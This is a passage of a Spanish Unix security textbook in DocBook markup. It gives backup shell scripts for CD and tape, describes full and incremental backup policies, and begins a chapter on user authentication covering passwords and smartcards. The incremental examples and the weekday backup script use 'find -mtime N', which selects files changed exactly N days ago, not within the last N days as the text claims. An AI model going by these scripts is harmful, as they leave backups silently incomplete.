&#x00A0;#!/bin/sh
&#x00A0;#&#x00A0;Vuelca&#x00A0;el&#x00A0;directorio&#x00A0;pasado&#x00A0;como&#x00A0;parametro,&#x00A0;y&#x00A0;todos&#x00A0;sus&#x00A0;descendientes,
&#x00A0;#&#x00A0;en&#x00A0;un&#x00A0;CD-ROM
&#x00A0;MKISOFS=/usr/local/bin/mkisofs
&#x00A0;CDRECORD=/usr/local/bin/cdrecord
&#x00A0;if&#x00A0;(test&#x00A0;$#&#x00A0;-lt&#x00A0;1);&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;Usage:&#x00A0;$0&#x00A0;/files&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;exit
&#x00A0;fi
&#x00A0;size=&#x2018;$MKISOFS&#x00A0;-r&#x00A0;-J&#x00A0;-l&#x00A0;-print-size&#x00A0;-f&#x00A0;$1&#x00A0;2&#x003E;&#x0026;1|tail&#x00A0;-1|awk&#x00A0;&#x2019;{print&#x00A0;$8}&#x2019;&#x2018;
&#x00A0;nice&#x00A0;--20&#x00A0;$MKISOFS&#x00A0;-r&#x00A0;-J&#x00A0;-l&#x00A0;-f&#x00A0;$1&#x00A0;|&#x00A0;nice&#x00A0;--20&#x00A0;$CDRECORD&#x00A0;dev=0,1,0&#x00A0;fs=16m&#x005C;
&#x00A0;&#x00A0;tsize=$size*2048&#x00A0;-eject&#x00A0;-
&#x00A0;anita:~#
</literallayout>
<!--l. 851--><para>Como vemos, se asigna el tama~no de los datos a grabar a la variable &#x2018;size&#x2019;, y despu&#x00E9;s se pasa este
n&#x00FA;mero a cdrecord; de esta forma, para realizar una copia de seguridad de un directorio como
/export/home/toni/, no tenemos m&#x00E1;s que ejecutar el shellscript pas&#x00E1;ndole el nombre de este directorio
como par&#x00E1;metro.
  </para></section><!--end subsection--></section><!--end section--><!--l. 857--><section 
role="section"><title><abbrev role="title-mark">7.4</abbrev><anchor 
   id="x1-1080007.4"  ></anchor>Pol&#x02CA;&#x0131;ticas de copias de seguridad</title>
<!--l. 860--><para>  La forma m&#x00E1;s elemental de realizar una copia de seguridad consiste simplemente en volcar los archivos a
salvaguardar a un dispositivo de backup, con el procedimiento que sea; por ejemplo, si deseamos guardar
todo el contenido del directorio /export/home/, podemos empaquetarlo en un archivo, comprimirlo y a
continuaci&#x00F3;n almacenarlo en una cinta:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;tar&#x00A0;cf&#x00A0;backup.tar&#x00A0;/export/home/
&#x00A0;anita:~#&#x00A0;compress&#x00A0;backup.tar
&#x00A0;anita:~#&#x00A0;dd&#x00A0;if=backup.tar.Z&#x00A0;of=/dev/rmt/0
</literallayout>
<!--l. 874--><para>Si en lugar de una cinta quisi&#x00E9;ramos utilizar otro disco duro, por ejemplo montado en /mnt/, podemos
simplemente copiar los &#xFB01;cheros deseados:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cp&#x00A0;-rp&#x00A0;/export/home/&#x00A0;&#x00A0;/mnt/
</literallayout>
<!--l. 883--><para>Esta forma de realizar backups volcando en el dispositivo de copia los archivos o directorios deseados se
denomina copia de seguridad completa o de nivel 0. Unix utiliza el concepto de nivel de copia de
seguridad para distinguir diferentes tipos de backups: una copia de cierto nivel almacena los archivos
modi&#xFB01;cados desde el &#x00FA;ltimo backup de nivel inferior. As&#x02CA;&#x0131;, las copias completas son, por de&#xFB01;nici&#x00F3;n, las de nivel
0; las copias de nivel 1 guardan los archivos modi&#xFB01;cados desde la &#x00FA;ltima copia de nivel 0 (es decir, desde el
&#x00FA;ltimo backup completo), mientras que las de nivel 2 guardan los archivos modi&#xFB01;cados desde la &#x00FA;ltima
copia de nivel 1, y as&#x02CA;&#x0131; sucesivamente (en realidad, el nivel m&#x00E1;ximo utilizado en la pr&#x00E1;ctica es el
2).
<!--br/-->
<!--br/-->Como hemos dicho, las copias completas constituyen la pol&#x02CA;&#x0131;tica m&#x00E1;s b&#x00E1;sica para realizar backups, y como
todas las pol&#x02CA;&#x0131;ticas tiene ventajas e inconvenientes; la principal ventaja de las copias completas es su
facilidad de realizaci&#x00F3;n y, dependiendo del mecanismo utilizado, la facilidad que ofrecen para restaurar
&#xFB01;cheros en algunas situaciones: si nos hemos limitado a copiar una serie de directorios a otro disco y
necesitamos restaurar cierto archivo, no tenemos m&#x00E1;s que montar el disco de backup y copiar el &#xFB01;chero
solicitado a su ubicaci&#x00F3;n original.
<!--br/-->
<!--br/-->Sin embargo, las copias completas presentan graves inconvenientes; uno de ellos es la di&#xFB01;cultad para
restaurar &#xFB01;cheros si utilizamos m&#x00FA;ltiples dispositivos de copia de seguridad (por ejemplo, varias cintas).
Otro inconveniente, m&#x00E1;s importante, de las copias de nivel 0 es la cantidad de recursos que consumen, tanto
en tiempo como en hardware; para solucionar el problema de la cantidad de recursos utilizados
aparece el concepto de copia de seguridad incremental. Un backup incremental o progresivo
consiste en copiar s&#x00F3;lamente los archivos que han cambiado desde la realizaci&#x00F3;n de otra copia
(incremental o total). Por ejemplo, si hace una semana realizamos un backup de nivel 0 en nuestro
sistema y deseamos una copia incremental con respecto a &#x00E9;l, hemos de guardar los &#xFB01;cheros
modi&#xFB01;cados en los &#x00FA;ltimos siete d&#x02CA;&#x0131;as (copia de nivel 1); podemos localizar estos &#xFB01;cheros con la orden
find:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;find&#x00A0;/export/home/&#x00A0;-mtime&#x00A0;7&#x00A0;-print
</literallayout>
<!--l. 924--><para>Si hace un d&#x02CA;&#x0131;a ya realizamos una copia incremental y ahora queremos hacer otra copia progresiva con
respecto a ella, hemos de almacenar &#x00FA;nicamente los archivos modi&#xFB01;cados en las &#x00FA;ltimas 24 horas (copia de
nivel 2); como antes, podemos utilizar find para localizar los archivos modi&#xFB01;cados en este intervalo de
tiempo:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;find&#x00A0;/export/home/&#x00A0;-mtime&#x00A0;1&#x00A0;-print
</literallayout>
<!--l. 936--><para>Esta pol&#x02CA;&#x0131;tica de realizar copias de seguridad sobre la &#x00FA;ltima progresiva se denomina de copia de seguridad
diferencial.
<!--br/-->
<!--br/-->La principal ventaja de las copias progresivas es que requieren menos tiempo para ser realizadas y menos
capacidad de almacenamiento que las completas; sin embargo, como desventajas tenemos que la
restauraci&#x00F3;n de &#xFB01;cheros puede ser m&#x00E1;s compleja que con las copias de nivel 0, y tambi&#x00E9;n que un solo fallo
en uno de los dispositivos de almacenamiento puede provocar la p&#x00E9;rdida de gran cantidad de
archivos; para restaurar completamente un sistema, debemos restaurar la copia m&#x00E1;s reciente
de cada nivel, en orden, comenzando por la de nivel 0. De esta forma, parece l&#x00F3;gico que la
estrategia seguida sea un t&#x00E9;rmino medio entre las vistas aqu&#x02CA;&#x0131;, una pol&#x02CA;&#x0131;tica de copias de seguridad
que mezcle el enfoque completo y el progresivo: una estrategia muy habitual, tanto por su
simpleza como porque no requiere mucho hardware consiste en realizar peri&#x00F3;dicamente copias de
seguridad de nivel 0, y entre ellas realizar ciertas copias progresivas de nivel 1. Por ejemplo,
imaginemos un departamento que decide realizar cada domingo una copia de seguridad completa de
sus directorios de usuario y de /etc/, y una progresiva sobre ella, pero s&#x00F3;lo de los directorios
de usuario, cada d&#x02CA;&#x0131;a lectivo de la semana. Un shellscript que realize esta tarea puede ser el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;#!/bin/sh
&#x00A0;DIA=&#x2018;date&#x00A0;+%a&#x2018;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;Dia&#x00A0;de&#x00A0;la&#x00A0;semana
&#x00A0;DIREC=&#x0022;/tmp/backup/&#x0022;&#x00A0;&#x00A0;#&#x00A0;Un&#x00A0;directorio&#x00A0;para&#x00A0;hacer&#x00A0;el&#x00A0;backup
&#x00A0;
&#x00A0;hazback&#x00A0;()&#x00A0;{
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;cd&#x00A0;$DIREC
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;tar&#x00A0;cf&#x00A0;backup.tar&#x00A0;$FILES
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;compress&#x00A0;backup.tar
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;dd&#x00A0;if=backup.tar.Z&#x00A0;of=/dev/rmt/0
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;rm&#x00A0;-f&#x00A0;backup.tar.Z
&#x00A0;}
&#x00A0;
&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-d&#x00A0;$DIREC&#x00A0;];
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;No&#x00A0;existe&#x00A0;$DIREC
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;$DIREC
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chmod&#x00A0;700&#x00A0;$DIREC&#x00A0;&#x00A0;#&#x00A0;Por&#x00A0;seguridad
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;else
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;rm&#x00A0;-rf&#x00A0;$DIREC
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;$DIREC
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;chmod&#x00A0;700&#x00A0;$DIREC
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi;
&#x00A0;case&#x00A0;$DIA&#x00A0;in
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;Mon&#x0022;)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;Lunes,&#x00A0;progresiva
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;FILES=&#x2018;find&#x00A0;/export/home/&#x00A0;-mtime&#x00A0;1&#x00A0;-print&#x2018;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;hazback
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;;;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;Tue&#x0022;)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;Martes,&#x00A0;progresiva
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;FILES=&#x2018;find&#x00A0;/export/home/&#x00A0;-mtime&#x00A0;2&#x00A0;-print&#x2018;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;hazback
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;;;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;Wed&#x0022;)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;Miercoles,&#x00A0;progresiva
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;FILES=&#x2018;find&#x00A0;/export/home/&#x00A0;-mtime&#x00A0;3&#x00A0;-print&#x2018;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;hazback
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;;;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;Thu&#x0022;)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;Jueves,&#x00A0;progresiva
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;FILES=&#x2018;find&#x00A0;/export/home/&#x00A0;-mtime&#x00A0;4&#x00A0;-print&#x2018;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;hazback
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;;;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;Fri&#x0022;)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;Viernes,&#x00A0;progresiva
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;FILES=&#x2018;find&#x00A0;/export/home/&#x00A0;-mtime&#x00A0;5&#x00A0;-print&#x2018;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;hazback
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;;;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;Sat&#x0022;)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;Sabado,&#x00A0;descansamos...
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;;;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x0022;Sun&#x0022;)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;Domingo,&#x00A0;copia&#x00A0;completa&#x00A0;de&#x00A0;/export/home&#x00A0;y&#x00A0;/etc

&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;FILES=&#x0022;/export/home/&#x00A0;/etc/&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;hazback
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;;;
&#x00A0;esac
</literallayout>
<!--l. 1019--><para>Este programa determina el d&#x02CA;&#x0131;a de la semana y en funci&#x00F3;n de &#x00E9;l realiza &#x2013; o no, si es s&#x00E1;bado &#x2013; una copia de los
&#xFB01;cheros correspondientes (n&#x00F3;tese el uso de las comillas inversas en la orden find). Podr&#x02CA;&#x0131;amos automatizarlo
mediante la facilidad cron de nuestro sistema para que se ejecute, por ejemplo, cada d&#x02CA;&#x0131;a a las tres del
mediod&#x02CA;&#x0131;a (una hora en la que la actividad del sistema no ser&#x00E1; muy alta); de esta forma, como
administradores, s&#x00F3;lo deber&#x02CA;&#x0131;amos preocuparnos por cambiar las cintas cada d&#x02CA;&#x0131;a, y dejar una preparada para
el &#xFB01;n de semana. Si decidimos plani&#xFB01;carlo para que se ejecute de madrugada, hemos de tener en cuenta
que el backup de un lunes de madrugada, antes de llegar al trabajo, puede sobreescribir el completo,
realizado el domingo de madrugada, por lo que habr&#x02CA;&#x0131;a que modi&#xFB01;car el shellscript; tambi&#x00E9;n
hemos de estar atentos a situaciones inesperadas, como que no existan archivos a copiar o
que nuestro sistema no disponga del su&#xFB01;ciente disco duro para almacenar temporalmente la
copia.
<!--br/-->
<!--br/-->El medio de almacenamiento tambi&#x00E9;n es importante a la hora de dise~nar una pol&#x02CA;&#x0131;tica de copias de
seguridad correcta. Si se trata de dispositivos baratos, como los CD-ROMs, no suele haber muchos
problemas: para cada volcado (sea del tipo que sea) se utiliza una unidad diferente, unidad que adem&#x00E1;s
no se suele volver a utilizar a no ser que se necesite recuperar los datos; el uso de unidades
regrabables en este caso es minoritario y poco recomendable, por lo que no vamos a entrar en &#x00E9;l. No
obstante, algo muy diferente son los medios de almacenamiento m&#x00E1;s caros, generalmente las
cintas magn&#x00E9;ticas; al ser ahora el precio algo a tener m&#x00E1;s en cuenta, lo habitual es reutilizar
unidades, sobreescribir las copias de seguridad m&#x00E1;s antiguas con otras m&#x00E1;s actualizadas. Esto puede
llegar a convertirse en un grave problema si por cualquier motivo reutilizamos cintas de las
que necesitamos recuperar informaci&#x00F3;n; aparte del desgaste f&#x02CA;&#x0131;sico del medio, podemos llegar a
extremos en los que se pierda toda la informaci&#x00F3;n guardada: imaginemos, por ejemplo, que s&#x00F3;lo
utilizamos una cinta de 8mm. para crear backups del sistema: aunque habitualmente todo funcione
correctamente (se cumple de forma estricta la pol&#x02CA;&#x0131;tica de copias, se veri&#xFB01;can, se almacenan
en un lugar seguro&#x2026;), puede darse el caso de que durante el proceso de copia se produzca
un incendio en la sala de operaciones, incendio que destruir&#x00E1; tanto nuestro sistema como la
cinta donde guardamos su backup, con lo que habremos perdido toda nuestra informaci&#x00F3;n.
Aunque este es un ejemplo quiz&#x00E1;s algo extremo, podemos pensar en lugares donde se utilicen de
forma incorrecta varios juegos de copias o en situaciones en las que el sistema se corrompe
(no ha de tratarse necesariamente de algo tan poco frecuente como un incendio, sino que se
puede tratar de un simple corte de &#xFB02;uido el&#x00E9;ctrico que da~ne los discos); debemos asegurarnos
siempre de que podremos recuperar con una probabilidad alta la &#x00FA;ltima copia de seguridad
realizada sobre cada archivo importante de nuestro sistema, especialmente sobre las bases de
datos.


</para><!--l. 1--><para>

  </para></section><!--end section--></section><!--end chapter--><!--l. 1--><section 
role="chapter"><title><anchor 
   id="x1-1090008"  ></anchor>Autenticaci&#x00F3;n de usuarios</title>
  <!--l. 3--><section 
role="section"><title><abbrev role="title-mark">8.1</abbrev><anchor 
   id="x1-1100008.1"  ></anchor>Introducci&#x00F3;n y conceptos b&#x00E1;sicos</title>
<!--l. 4--><para>  Ya sabemos que unos requerimientos primordiales de los sistemas inform&#x00E1;ticos que desempe~nan tareas
importantes son los mecanismo de seguridad adecuados a la informaci&#x00F3;n que se intenta proteger; el
conjunto de tales mecanismos ha de incluir al menos un sistema que permita identi&#xFB01;car a las
entidades (elementos activos del sistema, generalmente usuarios) que intentan acceder a los
objetos (elementos pasivos, como &#xFB01;cheros o capacidad de c&#x00F3;mputo), mediante procesos tan
simples como una contrase~na o tan complejos como un dispositivo analizador de patrones
retinales.
<!--br/-->
<!--br/-->Los sistemas que habitualmente utilizamos los humanos para identi&#xFB01;car a una persona, como
el aspecto f&#x02CA;&#x0131;sico o la forma de hablar, son demasiado complejos para una computadora; el
objetivo de los sistemas de identi&#xFB01;caci&#x00F3;n de usuarios no suele ser identi&#xFB01;car a una persona, sino
autenticar que esa persona es quien dice ser realmente. Aunque como humanos seguramente ambos
t&#x00E9;rminos nos parecer&#x00E1;n equivalentes, para un ordenador existe una gran diferencia entre ellos:
imaginemos un potencial sistema de identi&#xFB01;caci&#x00F3;n estrictamente hablando, por ejemplo uno
biom&#x00E9;trico basado en el reconocimiento de la retina; una persona mirar&#x02CA;&#x0131;a a trav&#x00E9;s del dispositivo
lector, y el sistema ser&#x02CA;&#x0131;a capaz de decidir si es un usuario v&#x00E1;lido, y en ese caso decir de qui&#x00E9;n se
trata; esto es identi&#xFB01;caci&#x00F3;n. Sin embargo, lo que habitualmente hace el usuario es introducir su
identidad (un n&#x00FA;mero, un nombre de usuario&#x2026;) adem&#x00E1;s de mostrar sus retinas ante el lector; el
sistema en este caso no tiene que identi&#xFB01;car a esa persona, sino autenticarlo: comprobar los
par&#x00E1;metros de la retina que est&#x00E1; leyendo con los guardados en una base de datos para el usuario que
la persona dice ser: estamos reduciendo el problema de una poblaci&#x00F3;n potencialmente muy
elevada a un grupo de usuarios m&#x00E1;s reducido, el grupo de usuarios del sistema que necesita
autenticarlos.
<!--br/-->
<!--br/-->Los m&#x00E9;todos de autenticaci&#x00F3;n se suelen dividir en tres grandes categor&#x02CA;&#x0131;as (<citation>[?]</citation>, <citation>[?]</citation>), en funci&#x00F3;n de lo que
utilizan para la veri&#xFB01;caci&#x00F3;n de identidad: (a) algo que el usuario sabe, (b) algo que &#x00E9;ste posee, y (c) una
caracter&#x02CA;&#x0131;stica f&#x02CA;&#x0131;sica del usuario o un acto involuntario del mismo. Esta &#x00FA;ltima categor&#x02CA;&#x0131;a se conoce con el
nombre de autenticaci&#x00F3;n biom&#x00E9;trica. Es f&#x00E1;cil ver ejemplos de cada uno de estos tipos de autenticaci&#x00F3;n:
un password (Unix) o passphrase (PGP) es algo que el usuario conoce y el resto de personas
no, una tarjeta de identidad es algo que el usuario lleva consigo, la huella dactilar es una
caracter&#x02CA;&#x0131;stica f&#x02CA;&#x0131;sica del usuario, y un acto involuntario podr&#x02CA;&#x0131;a considerarse que se produce al &#xFB01;rmar (al
rubricar la &#xFB01;rma no se piensa en el dise~no de cada trazo individualmente). Por supuesto, un
sistema de autenticaci&#x00F3;n puede (y debe, para incrementar su &#xFB01;abilidad) combinar mecanismos de
diferente tipo, como en el caso de una tarjeta de cr&#x00E9;dito junto al PIN a la hora de utilizar
un cajero autom&#x00E1;tico o en el de un dispositivo generador de claves para el uso de One Time
Passwords.
<!--br/-->
<!--br/-->Cualquier sistema de identi&#xFB01;caci&#x00F3;n (aunque les llamemos as&#x02CA;&#x0131;, recordemos que realmente son sistemas de
autenticaci&#x00F3;n) ha de poseer unas determinadas caracter&#x02CA;&#x0131;sticas para ser viable; obviamente, ha de ser &#xFB01;able
con una probabilidad muy elevada (podemos hablar de tasas de fallo de <informalequation><graphic 
fileref="unixsec58x.gif"></graphic></informalequation> en los sistemas menos
seguros), econ&#x00F3;micamente factible para la organizaci&#x00F3;n (si su precio es superior al valor de lo que se intenta
proteger, tenemos un sistema incorrecto) y ha de soportar con &#x00E9;xito cierto tipo de ataques
(por ejemplo, imaginemos que cualquier usuario puede descifrar el password utilizado en el
sistema de autenticaci&#x00F3;n de Unix en tiempo polinomial; esto ser&#x02CA;&#x0131;a inaceptable). Aparte de estas
caracter&#x02CA;&#x0131;sticas tenemos otra, no t&#x00E9;cnica sino humana, pero quiz&#x00E1;s la m&#x00E1;s importante: un sistema de
autenticaci&#x00F3;n ha de ser aceptable para los usuarios (<citation>[?]</citation>), que ser&#x00E1;n al &#xFB01;n y al cabo quienes lo
utilicen. Por ejemplo, imaginemos un potencial sistema de identi&#xFB01;caci&#x00F3;n para acceder a los
recursos de la Universidad, consistente en un dispositivo que fuera capaz de realizar un an&#x00E1;lisis
de sangre a un usuario y as&#x02CA;&#x0131; comprobar que es quien dice ser; seguramente ser&#x02CA;&#x0131;a barato y
altamente &#xFB01;able, pero nadie aceptar&#x02CA;&#x0131;a dar un poco de sangre cada vez que desee consultar su
correo.

  </para></section><!--end section--><!--l. 69--><section 
role="section"><title><abbrev role="title-mark">8.2</abbrev><anchor 
   id="x1-1110008.2"  ></anchor>Sistemas basados en algo conocido: contrase~nas</title>
<!--l. 70--><para>  El modelo de autenticaci&#x00F3;n m&#x00E1;s b&#x00E1;sico consiste en decidir si un usuario es quien dice ser simplemente
bas&#x00E1;ndonos en una prueba de conocimiento que a priori s&#x00F3;lo ese usuario puede superar; y desde Al&#x02CA;&#x0131; Bab&#x00E1; y su
&#x2018;&#x00C1;brete, S&#x00E9;samo&#x2019; hasta los m&#x00E1;s modernos sistemas Unix, esa prueba de conocimiento no es m&#x00E1;s que una
contrase~na que en principio es secreta. Evidentemente, esta aproximaci&#x00F3;n es la m&#x00E1;s vulnerable a todo tipo
de ataques, pero tambi&#x00E9;n la m&#x00E1;s barata, por lo que se convierte en la t&#x00E9;cnica m&#x00E1;s utilizada en
entornos que no precisan de una alta seguridad, como es el caso de los sistemas Unix en redes
normales (y en general en todos los sistemas operativos en redes de seguridad media&#x2013;baja);
otros entornos en los que se suele aplicar este modelo de autenticaci&#x00F3;n son las aplicaciones que
requieren de alguna identi&#xFB01;caci&#x00F3;n de usuarios, como el software de cifrado PGP o el esc&#x00E1;ner de
seguridad NESSUS. Tambi&#x00E9;n se utiliza como complemento a otros mecanismos de autenticaci&#x00F3;n, por
ejemplo en el caso del N&#x00FA;mero de Identi&#xFB01;caci&#x00F3;n Personal (PIN) a la hora de utilizar cajeros
autom&#x00E1;ticos.
<!--br/-->
<!--br/-->En todos los esquemas de autenticaci&#x00F3;n basados en contrase~nas se cumple el mismo protocolo: las entidades
(generalmente dos) que participan en la autenticaci&#x00F3;n acuerdan una clave, clave que han de
mantener en secreto si desean que la autenticaci&#x00F3;n sea &#xFB01;able. Cuando una de las partes desea
autenticarse ante otra se limita a mostrarle su conocimiento de esa clave com&#x00FA;n, y si &#x00E9;sta es correcta se
otorga el acceso a un recurso. Lo habitual es que existan unos roles preestablecidos, con una
entidad activa que desea autenticarse y otra pasiva que admite o rechaza a la anterior (en el
modelo del acceso a sistemas Unix, tenemos al usuario y al sistema que le permite o niega la
entrada).
<!--br/-->
<!--br/-->Como hemos dicho, este esquema es muy fr&#x00E1;gil: basta con que una de las partes no mantenga la contrase~na
en secreto para que toda la seguridad del modelo se pierda; por ejemplo, si el usuario de una m&#x00E1;quina
Unix comparte su clave con un tercero, o si ese tercero consigue leerla y rompe su cifrado
(por ejemplo, como veremos luego, mediante un ataque de diccionario), autom&#x00E1;ticamente esa
persona puede autenticarse ante el sistema con &#x00E9;xito con la identidad de un usuario que no le
corresponde.
<!--br/-->
<!--br/-->En el punto  <ulink 
  url="#x1-1210008.5"  ><!--ref: unixua--></ulink> hablaremos con m&#x00E1;s detalle del uso de contrase~nas para el caso de la autenticaci&#x00F3;n de usuarios
en Unix.
  </para></section><!--end section--><!--l. 106--><section 
role="section"><title><abbrev role="title-mark">8.3</abbrev><anchor 
   id="x1-1120008.3"  ></anchor>Sistemas basados en algo pose&#x02CA;&#x0131;do: tarjetas inteligentes</title>
<!--l. 107--><para>  Hace m&#x00E1;s de veinte a~nos un periodista franc&#x00E9;s llamado Roland Moreno patentaba la integraci&#x00F3;n de un
procesador en una tarjeta de pl&#x00E1;stico; sin duda, no pod&#x02CA;&#x0131;a imaginar el abanico de aplicaciones de
seguridad que ese nuevo dispositivo, denominado chipcard, estaba abriendo. Desde entonces,
cientos de millones de esas tarjetas han sido fabricadas, y son utilizadas a diario para &#xFB01;nes que
var&#x02CA;&#x0131;an desde las tarjetas monedero m&#x00E1;s sencillas hasta el control de accesos a instalaciones
militares y agencias de inteligencia de todo el mundo; cuando a las chipcards se les incorpor&#x00F3; un
procesador inteligente nacieron las smartcards, una gran revoluci&#x00F3;n en el &#x00E1;mbito de la autenticaci&#x00F3;n de
usuarios.
<!--br/-->
<!--br/-->Desde un punto de vista formal (<citation>[?]</citation>), una tarjeta inteligente (o smartcard) es un dispositivo de seguridad
del tama~no de una tarjeta de cr&#x00E9;dito, resistente a la adulteraci&#x00F3;n, que ofrece funciones para un
almacenamiento seguro de informaci&#x00F3;n y tambi&#x00E9;n para el procesamiento de la misma en base a
tecnolog&#x02CA;&#x0131;a VLSI. En la pr&#x00E1;ctica, las tarjetas inteligentes poseen un chip empotrado en la propia
tarjeta que puede implementar un sistema de &#xFB01;cheros cifrado y funciones criptogr&#x00E1;&#xFB01;cas, y adem&#x00E1;s
puede detectar activamente intentos no v&#x00E1;lidos de acceso a la informaci&#x00F3;n almacenada (<citation>[?]</citation>);
este chip inteligente es el que las diferencia de las simples tarjetas de cr&#x00E9;dito, que s&#x00F3;lamente
incorporan una banda magn&#x00E9;tica donde va almacenada cierta informaci&#x00F3;n del propietario de la
tarjeta.
<!--br/--></para><figure><title/><blockquote>


<section role="center"><title/>
<!--l. 130--><para> heightwidthdepthsmartcard.png<graphic width="62.88887pt" fileref="smartcard.png" ></graphic></para></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-1120011"  ></anchor>Figura&#x00A0;8.1</title><para>Estructura gen&#x00E9;rica de una smartcard.</para></blockquote>

  </blockquote></figure>
<!--br/-->En la &#xFB01;gura  <ulink 
  url="#x1-1120011"  ><!--ref: sc--></ulink> se muestra la estructura m&#x00E1;s generalista de una tarjeta inteligente; en ella podemos observar
que el acceso a las &#x00E1;reas de memoria s&#x00F3;lamente es posible a trav&#x00E9;s de la unidad de entrada/salida y de una
CPU (t&#x02CA;&#x0131;picamente de 8 bits), lo que evidentemente aumenta la seguridad del dispositivo. Existe tambi&#x00E9;n un
sistema operativo empotrado en la tarjeta &#x2013; generalmente en ROM, aunque tambi&#x00E9;n se puede extender con
funciones en la EEPROM &#x2013; cuya funci&#x00F3;n es realizar tareas criptogr&#x00E1;&#xFB01;cas (algoritmos de cifrado como RSA o
